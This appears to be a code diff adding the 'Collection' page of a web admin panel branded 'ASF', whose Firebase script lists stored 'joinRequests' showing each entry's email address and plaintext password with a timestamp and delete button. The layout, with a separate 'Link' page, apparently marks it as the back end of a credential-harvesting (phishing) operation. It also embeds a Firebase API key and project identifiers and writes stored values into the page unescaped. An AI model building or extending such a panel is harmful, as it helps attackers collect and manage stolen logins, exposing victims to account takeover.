@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Collection</title>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="../logo.png">
+  <link rel="apple-touch-icon" href="../logo.png">
+
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+
+  <link rel="stylesheet" href="collection.css">
+</head>
+<body>
+  
+<script type="module">
+  import { logout } from "../firebase/auth.js";
+  window.logout = logout;
+</script>
+
+<div class="dashboard-container">
+  <aside class="sidebar">
+    <div class="logo">
+      <img src="../logo.png" alt="Logo">
+      <h2>ASF</h2>
+    </div>
+    <nav>
+      <ul>
+        <li><a href="/dashboard/"><i class="fas fa-home"></i> Dashboard</a></li>
+        <li><a href="/dashboard/collection/" class="active"><i class="fas fa-layer-group"></i> Collection</a></li>
+        <li><a href="/dashboard/link/"><i class="fas fa-link"></i> Link</a></li>
+        <li><a href="/dashboard/user-management/"><i class="fas fa-users"></i> User Management</a></li>
+        <li><a href="/login/" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+      </ul>
+    </nav>
+  </aside>
+
+  <main class="main-content">
+    <h1>Collection</h1>
+    <div id="notifications"></div>
+    <table id="collectionTable">
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>Password</th>
+          <th>Time</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </main>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyArUMHWhrM-g0m0-kXTu_EWmGACetQvLlc",
+  authDomain: "asf-panel-sm.firebaseapp.com",
+  projectId: "asf-panel-sm",
+  storageBucket: "asf-panel-sm.firebasestorage.app",
+  messagingSenderId: "444535178333",
+  appId: "1:444535178333:web:da733a6f819a0c4529f9b4",
+  measurementId: "G-BSFWL4LLY5"
+};
+
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const tableBody = document.querySelector("#collectionTable tbody");
+const notifications = document.getElementById("notifications");
+
+const requestsRef = ref(db, 'joinRequests');
+
+onValue(requestsRef, (snapshot) => {
+  const data = snapshot.val();
+  tableBody.innerHTML = '';
+
+  if (!data) {
+    notifications.innerHTML = `<p>No requests found</p>`;
+    return;
+  }
+
+  const keys = Object.keys(data);
+  notifications.innerHTML = `<p>${keys.length} requests found</p>`;
+
+  keys.forEach(key => {
+    const request = data[key];
+
+    // Timestamp formatting
+    let formattedTime = "N/A";
+    if (request.timestamp) {
+      const date = new Date(request.timestamp);
+      formattedTime = date.toLocaleString("en-GB", { timeZone: "Asia/Dhaka" });
+    }
+
+    tableBody.innerHTML += `
+      <tr>
+        <td>${request.email || ''}</td>
+        <td>${request.password || ''}</td>
+        <td>${formattedTime}</td>
+        <td>
+          <button onclick="deleteRequest('${key}')">Delete</button>
+        </td>
+      </tr>
+    `;
+  });
+});
+
+// Logout function
+window.logout = () => 
+  alert("Logout functionality here!");
+
+// Delete Request
+window.deleteRequest = function(key){
+  if(confirm("Are you sure you want to delete this request?")){
+    remove(ref(db, `joinRequests/${key}`))
+      .then(()=> alert("Request deleted successfully"))
+      .catch(err => alert("Error: "+err.message));
+  }
+}
+</script>
+</body>
+</html>
